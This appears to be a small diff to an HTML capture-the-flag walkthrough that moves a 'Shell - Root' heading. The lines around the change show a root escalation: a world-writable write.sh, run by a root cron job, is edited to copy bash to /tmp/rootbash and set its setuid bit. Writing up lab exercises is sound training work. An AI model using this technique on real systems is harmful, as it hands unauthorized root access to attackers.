@@ -92,6 +92,8 @@ www-data@sar:/var/www/html$ cat /etc/cron*&#13;&#10;cat: /etc/cron.d: Is a direc
 www-data@sar:/var/www/html$ cat finally.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;./write.sh
     </pre>
 
+    <h2><a id="root">Shell - Root</a></h2>
+
     <li>It appears that finally.sh simply runs write.sh.  We do not have write permissions to finally.sh so we cannot exploit it directly.  So let's take a look at write.sh and see what we can do with that.</li>
 
     <pre>
@@ -99,10 +101,6 @@ www-data@sar:/var/www/html$ ls -la write.sh&#13;&#10;-rwxrwxrwx 1 www-data www-d
     </pre>
 
     <li>write.sh simply creates the file /tmp/gateway.  However, we have write access to write.sh, so all we need to do is edit the contents with our own malicious command.  When root runs finally.sh under it's cronjob, it will execute write.sh, which will execute our malicious command.</li>
-
-    <br>
-
-    <h2><a id="root">Shell - Root</a></h2>
 
     <pre>
 www-data@sar:/var/www/html$ cat write.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
